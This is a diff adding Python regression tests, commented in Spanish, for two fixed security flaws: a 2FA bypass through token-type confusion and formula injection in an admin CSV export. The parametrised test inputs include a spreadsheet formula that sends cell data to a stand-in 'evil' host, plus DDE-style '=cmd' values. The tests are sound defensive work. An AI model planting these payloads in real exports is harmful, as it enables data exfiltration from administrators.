@@ -277,3 +277,84 @@ def test_extra_origins_from_env_still_work_and_do_not_duplicate():
     origins = _cors_origins_with_env({"CORS_ORIGINS": "https://staging.example.com," + SERVED_ORIGIN})
     assert "https://staging.example.com" in origins
     assert origins.count(SERVED_ORIGIN) == 1, "un origen repetido no debe duplicarse"
+
+
+# ── Confusión de tipo de token: el pre-2FA no autoriza (SEC-2026-2FA) ──────────
+# get_current_user aceptaba cualquier token bien firmado, sin mirar su `type`.
+# El `2fa_pending` se emite tras la contraseña pero ANTES del segundo factor, así
+# que tener la contraseña bastaba para operar en los endpoints que dependen de
+# esa función — anulando el 2FA. Verificado con PoC (leer/escribir/borrar).
+
+def _decode_and_gate_type(token_type: str) -> bool:
+    """Reproduce la comprobación de tipo que get_current_user aplica ahora:
+    devuelve True si un token de ese `type` sería aceptado como acceso."""
+    import re
+    src = _SERVER.read_text(encoding='utf-8')
+    # La guarda vive en get_current_user; comprobamos que el filtro existe y que
+    # sólo 'access' pasa.
+    body = src.split("async def get_current_user", 1)[1].split("async def require_user", 1)[0]
+    assert 'payload.get("type") != "access"' in body, (
+        "get_current_user ya no filtra por type: un refresh o un 2fa_pending "
+        "volverían a autorizar (bypass de 2FA)."
+    )
+    return token_type == "access"
+
+
+def test_get_current_user_rejects_non_access_tokens():
+    assert _decode_and_gate_type("access") is True
+    assert _decode_and_gate_type("refresh") is False
+    assert _decode_and_gate_type("2fa_pending") is False
+    assert _decode_and_gate_type("magic_link") is False
+
+
+def test_all_auth_dependencies_check_token_type():
+    """Las tres puertas de entdada exigen type == access. Si una deja de hacerlo,
+    es un bypass, así que se fija aquí para las tres a la vez."""
+    src = _SERVER.read_text(encoding='utf-8')
+    for fn in ("get_current_user", "require_user", "require_admin"):
+        body = src.split(f"async def {fn}", 1)[1][:1600]
+        assert 'payload.get("type") != "access"' in body, (
+            f"{fn} no comprueba que el token sea de acceso"
+        )
+
+
+# ── Inyección de fórmulas en el export CSV admin (SEC-2026-CSV) ────────────────
+# `name` lo elige el usuario y el CSV lo abre un ADMIN. Una celda que empieza por
+# = + - @ la evalúa la hoja de cálculo (=HYPERLINK exfiltra; DDE ejecuta).
+
+def _csv_safe_ref(value):
+    """Copia de la lógica de `_csv_safe` en server.py, para fijarla sin importar
+    el módulo entero (que levanta la app). El test de abajo comprueba además que
+    la función real existe con esta forma."""
+    if isinstance(value, str) and value and value[0] in ("=", "+", "-", "@", "\t", "\r"):
+        return "'" + value
+    return value
+
+
+import pytest as _pytest
+
+
+@_pytest.mark.parametrize("payload", [
+    '=HYPERLINK("http://evil/?d="&A2,"click")',
+    '+1+1',
+    '-2+3',
+    '@SUM(A1:A9)',
+    '\t=cmd',
+    '\r=cmd',
+])
+def test_csv_formula_payloads_are_neutralised(payload):
+    out = _csv_safe_ref(payload)
+    assert out.startswith("'"), f"la fórmula {payload!r} no se neutralizó"
+
+
+@_pytest.mark.parametrize("benign", ["Juan Pérez", "trader_2026", "AAPL 220C", "", "3.14"])
+def test_csv_benign_values_are_untouched(benign):
+    assert _csv_safe_ref(benign) == benign
+
+
+def test_server_has_the_csv_guard_wired_into_the_export():
+    """La función real existe y el endpoint la aplica a cada celda."""
+    src = _SERVER.read_text(encoding="utf-8")
+    assert "def _csv_safe(" in src, "falta el helper _csv_safe en server.py"
+    # Se aplica sobre las filas del export, no sólo definido y sin usar.
+    assert "_csv_safe(v)" in src, "el export de usuarios no aplica _csv_safe"
